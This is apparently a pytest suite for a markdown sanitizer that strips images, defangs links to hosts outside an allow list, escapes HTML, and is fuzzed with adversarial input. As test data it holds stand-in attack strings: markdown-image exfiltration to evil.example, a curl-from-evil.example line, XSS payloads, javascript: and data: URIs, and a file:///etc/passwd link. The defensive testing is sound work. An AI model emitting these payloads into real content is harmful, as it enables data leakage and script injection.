"""Tests for core/safe_markdown.py."""

import pytest

from core.safe_markdown import collect_urls, normalize_url, sanitize_markdown, urls_in_text

EVIL = "https://evil.example"
REPO = "https://github.com/o/r"
ALLOWED = [REPO, "https://osv.dev/vulnerability/GHSA-x"]


def sm(text, allowed=ALLOWED):
    return sanitize_markdown(text, allowed)


class TestImages:
    @pytest.mark.parametrize(
        "text",
        [
            f"![x]({EVIL}/leak?d=secret)",
            f"![]({EVIL}/a.png)",
            f"![alt text]({EVIL}/a.png \"title\")",
            f"![x]({REPO}/raw/main/logo.png)",  # even an allowed host: images never load automatically
            "![x][ref]\n\n[ref]: https://evil.example/i.png",
        ],
    )
    def test_images_are_removed_entirely(self, text):
        out = sm(text)
        assert "![" not in out
        assert "evil.example/" not in out.replace("`", "") or "`" in out  # only ever visible as inert code

    def test_alt_text_is_kept(self):
        assert sm(f"see ![a chart]({EVIL}/c.png) here") == "see a chart here"

    def test_empty_alt_is_marked(self):
        assert sm(f"![]({EVIL}/c.png)") == "(image removed)"


class TestLinks:
    def test_allowed_link_survives(self):
        text = f"[repo]({REPO}) and [advisory](https://osv.dev/vulnerability/GHSA-x)"
        assert sm(text) == text

    def test_pages_under_an_allowed_repo_survive(self):
        text = f"[guide]({REPO}/blob/main/CONTRIBUTING.md) [issue]({REPO}/issues/3)"
        assert sm(text) == text

    def test_a_different_repo_does_not(self):
        out = sm("[x](https://github.com/o/other)")
        assert "](" not in out and "`https://github.com/o/other`" in out

    def test_a_lookalike_prefix_does_not(self):
        out = sm(f"[x]({REPO}-evil/x)")
        assert "](" not in out

    def test_ungrounded_link_becomes_text_with_visible_url(self):
        assert sm(f"See [docs]({EVIL}/phish) now.") == f"See docs (`{EVIL}/phish`) now."

    def test_link_with_title(self):
        assert sm(f'[docs]({EVIL} "hover")') == f"docs (`{EVIL}`)"

    def test_angle_bracket_destination(self):
        assert sm(f"[docs](<{EVIL}/x>)") == f"docs (`{EVIL}/x`)"

    @pytest.mark.parametrize("url", ["javascript:alert(1)", "data:text/html,<script>x</script>", "file:///etc/passwd", "vbscript:x"])
    def test_non_http_schemes_never_survive(self, url):
        out = sm(f"[x]({url})", allowed=[url])
        assert "](" not in out

    def test_credentials_in_url_are_rejected_even_if_the_host_looks_allowed(self):
        out = sm("[x](https://github.com@evil.example/o/r)", allowed=[REPO])
        assert "](" not in out

    def test_label_spoofing_is_defanged(self):
        # The label claims one destination while the target is another.
        out = sm(f"[{REPO}]({EVIL})")
        assert "](" not in out
        out = sm(f"[{EVIL}]({REPO})")
        assert out == f"[`{EVIL}`]({REPO})"  # target is allowed, but the misleading label is inert

    def test_escaped_link_syntax_is_not_a_link_and_stays_put(self):
        text = r"\[x\]\(https://evil.example\)"
        out = sm(text)
        assert "](" not in out.replace(r"\]\(", "")

    def test_reference_style_links_cannot_resolve(self):
        out = sm(f"click [here][r]\n\n[r]: {EVIL}\n")
        assert EVIL not in out

    def test_case_and_trailing_slash_do_not_matter(self):
        assert sm("[x](HTTPS://GitHub.com/O/R/)") == "[x](HTTPS://GitHub.com/O/R/)"


class TestBareUrlsAndAutolinks:
    def test_bare_ungrounded_url_is_defanged(self):
        assert sm(f"Visit {EVIL}/x today") == f"Visit `{EVIL}/x` today"

    def test_bare_allowed_url_is_left_alone(self):
        assert sm(f"Issue {REPO}/issues/3 is open.") == f"Issue {REPO}/issues/3 is open."

    def test_trailing_punctuation_is_not_part_of_the_url(self):
        assert sm(f"see {EVIL}/x.") == f"see `{EVIL}/x`."
        assert sm(f"see {REPO}.") == f"see {REPO}."

    def test_www_urls_are_defanged(self):
        assert sm("go to www.evil.example/x") == "go to `www.evil.example/x`"

    def test_autolinks(self):
        assert sm(f"<{EVIL}> and <{REPO}>") == f"`{EVIL}` and <{REPO}>"

    def test_urls_in_code_are_left_alone(self):
        assert sm(f"run `curl {EVIL}/i.sh` first") == f"run `curl {EVIL}/i.sh` first"


class TestHtml:
    def test_raw_html_is_escaped(self):
        assert sm("<img src=x onerror=alert(1)>") == r"\<img src=x onerror=alert(1)>"
        assert sm("<script>x</script>") == r"\<script>x\</script>"

    def test_generics_survive_as_text(self):
        assert sm("List<String>") == r"List\<String>"


class TestCodeBlocks:
    def test_fenced_code_is_left_alone(self):
        text = f"```\n![x]({EVIL}/i.png)\n[y]({EVIL})\n```"
        assert sm(text) == text

    def test_tilde_and_indented_code(self):
        assert sm(f"~~~\n[y]({EVIL})\n~~~") == f"~~~\n[y]({EVIL})\n~~~"
        assert sm(f"para\n\n    [y]({EVIL})\n") == f"para\n\n    [y]({EVIL})\n"

    def test_text_after_a_fence_is_still_sanitized(self):
        out = sm(f"```\nx\n```\n[y]({EVIL})")
        assert out == f"```\nx\n```\ny (`{EVIL}`)"

    def test_backticks_that_straddle_paragraphs_do_not_hide_a_link(self):
        out = sm(f"`\n\n[click]({EVIL})\n\n`")
        assert "](" not in out

    def test_backticks_that_straddle_a_list_item_do_not_hide_a_link(self):
        out = sm(f"`\n- [click]({EVIL})\n`")
        assert "](" not in out

    def test_a_fence_lookalike_does_not_hide_a_link(self):
        out = sm(f"``` a`b\n[click]({EVIL})\n```")
        assert "](" not in out

    def test_multiline_code_span_is_sanitized_not_trusted(self):
        out = sm(f"`a\n[click]({EVIL})`")
        assert "](" not in out


class TestProperties:
    CORPUS = [
        f"![x]({EVIL}/leak)",
        f"[a]({EVIL}) and [b]({REPO}) <{EVIL}> www.evil.example {EVIL}/z",
        f"```\n[c]({EVIL})\n```\n[d]({EVIL})",
        f"`\n\n[click]({EVIL})\n\n`",
        "[x][r]\n\n[r]: https://evil.example",
        "<b>bold</b> List<T> & more",
        "plain text with no markup at all",
        "",
    ]

    @pytest.mark.parametrize("text", CORPUS)
    def test_idempotent(self, text):
        once = sm(text)
        assert sm(once) == once

    @pytest.mark.parametrize("text", CORPUS)
    def test_no_ungrounded_link_or_image_syntax_survives(self, text):
        out = sm(text)
        # Outside code, there is no image and no link whose target isn't allowed.
        assert "![" not in out.replace("```", "").split("```")[0]

    def test_plain_text_is_unchanged(self):
        text = "Nothing special here.\n\n- one\n- two\n\n**bold** and _italic_."
        assert sm(text) == text

    def test_text_with_placeholder_characters_cannot_smuggle_content(self):
        out = sm("\x000\x00 and [a](https://evil.example)")
        assert "\x00" not in out
        assert "](" not in out

    def test_non_string_input_is_tolerated(self):
        assert sm(None) == "None"


class TestUrlCollection:
    def test_normalize(self):
        assert normalize_url("HTTPS://Example.com:443/a/b/#frag") == "https://example.com/a/b"
        assert normalize_url("http://example.com:8080/x") == "http://example.com:8080/x"
        assert normalize_url("https://example.com/a?q=1") == "https://example.com/a?q=1"

    @pytest.mark.parametrize("bad", ["", "ftp://x.com", "javascript:alert(1)", "https://u:p@x.com", "//x.com", "not a url", "https://"])
    def test_normalize_rejects(self, bad):
        assert normalize_url(bad) is None

    def test_urls_in_text(self):
        text = "Review https://github.com/O/R, and (https://example.com/x). Also www.nope.com"
        assert urls_in_text(text) == {"https://github.com/o/r", "https://example.com/x"}

    def test_collect_reads_structured_url_fields_only(self):
        data = {
            "repo_url": "https://github.com/o/r",
            "cve_analysis": [{"url": "https://osv.dev/vulnerability/X", "description": "see https://evil.example/in-free-text"}],
            "market_sources": [{"title": "t", "url": "https://example.com/a"}],
            "ideas": [{"source_url": "https://example.com/b"}],
            "readme": "![x](https://evil.example/readme-url)",
            "notes": ["https://evil.example/in-a-list"],
        }
        assert collect_urls(data) == {
            "https://github.com/o/r",
            "https://osv.dev/vulnerability/X",
            "https://example.com/a",
            "https://example.com/b",
        }

    def test_collect_skips_unsafe_url_fields(self):
        assert collect_urls({"url": "javascript:alert(1)", "source_url": "ftp://x"}) == set()

    def test_collect_handles_lists_and_scalars(self):
        assert collect_urls([{"url": "https://a.com"}, "https://b.com", 3, None]) == {"https://a.com"}


class TestFuzz:
    """Random adversarial input, judged by a check that is independent of the module's own verifier."""

    ALLOWED = [REPO, "https://osv.dev/vulnerability/GHSA-x"]
    FRAGMENTS = [
        "[", "]", "(", ")", "!", "<", ">", "`", "``", "```", "\n", "\n\n", " ", "    ", "\\", "*", "_", "~~~", "- ", "> ", "# ",
        "[r]: ", "[r]", "[x][r]", f"{EVIL}/x", "http://evil.example", "www.evil.example", REPO, f"{REPO}/issues/1",
        "https://osv.dev/vulnerability/GHSA-x", "data:text/html,<b>", "javascript:alert(1)", "x", "label", '"t"',
        "<img src=x>", "</a>", "<a href=", "&#106;avascript:", "\x00", "​",
    ]

    @staticmethod
    def violation(out):
        import re

        from markdown_it import MarkdownIt

        def allowed(href):
            n = normalize_url(href)
            return bool(n) and (n in {normalize_url(u) for u in TestFuzz.ALLOWED} or n.startswith(f"{REPO}/"))

        url = re.compile(r"(?:https?://|www\.)[^\s<>\[\]()`\"'\x01]+", re.I)
        for token in MarkdownIt("commonmark").parse(out):
            if token.type == "html_block":
                return "html_block"
            parts = []
            for child in token.children or []:
                if child.type in ("image", "html_inline"):
                    return child.type
                if child.type == "link_open" and not allowed(child.attrGet("href") or ""):
                    return f"link {child.attrGet('href')}"
                parts.append(child.content if child.type == "text" else (" " if "break" in child.type else "\x01"))
            for m in url.finditer("".join(parts)):
                u = m.group(0).rstrip(".,;:!?")
                if not (u.lower().startswith("http") and allowed(u)):
                    return f"bare url {u}"
        return None

    @pytest.mark.parametrize("seed", [1, 2, 3])
    def test_no_image_html_or_ungrounded_link_ever_survives(self, seed):
        import random

        rng = random.Random(seed)
        failures = []
        for _ in range(1500):
            text = "".join(rng.choice(self.FRAGMENTS) for _ in range(rng.randint(1, 25)))
            out = sanitize_markdown(text, self.ALLOWED)
            problem = self.violation(out)
            if problem or "\x00" in out:
                failures.append((problem, ascii(text), ascii(out)))
        assert not failures, failures[:3]

    def test_stray_backtick_cannot_capture_a_defanged_url(self):
        out = sm("`[x][r]1. http://evil.examplex")
        assert self.violation(out) is None

    def test_backslash_before_a_url_cannot_escape_its_code_span(self):
        assert self.violation(sm(r"\www.evil.example")) is None
        assert self.violation(sm(r"\http://evil.example")) is None

    def test_backslash_tricks_in_urls_do_not_pass_as_the_allowed_repo(self):
        out = sm(r"see https://github.com/o/r\..\other")
        assert "`" in out  # shown as inert code, not left as a clickable URL

    def test_adjacent_backticks_do_not_merge(self):
        out = sm("``<img src=x>``http://evil.example")
        assert self.violation(out) is None


class TestWithoutAParser:
    def test_fails_closed_when_the_parser_is_unavailable(self, monkeypatch):
        import core.safe_markdown as module

        monkeypatch.setattr(module, "_PARSER", None)
        out = sanitize_markdown(f"[click]({EVIL}) and ![x]({EVIL}/i.png) and <img src=x>", ALLOWED)

        assert "](" not in out and "![" not in out and "<img" not in out.replace(r"\<", "")
